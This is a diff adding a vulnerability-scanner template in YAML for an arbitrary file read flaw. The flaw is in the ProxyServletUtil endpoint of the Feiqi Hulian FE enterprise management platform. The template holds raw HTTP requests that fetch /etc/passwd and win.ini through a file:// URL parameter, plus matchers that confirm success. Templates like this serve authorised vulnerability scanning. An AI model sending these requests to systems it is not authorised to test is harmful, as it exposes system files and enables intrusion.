@@ -1,0 +1,30 @@
+id: poc-yaml-flyrise-proxyservletutil-any-readfile
+info:
+  name: 飞企互联-FE企业运营管理平台 ProxyServletUtil 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+http:
+  - raw:
+      - |
+        GET /ProxyServletUtil?url=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /ProxyServletUtil?url=file:///c://windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:[x*]:0:0:"
+
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
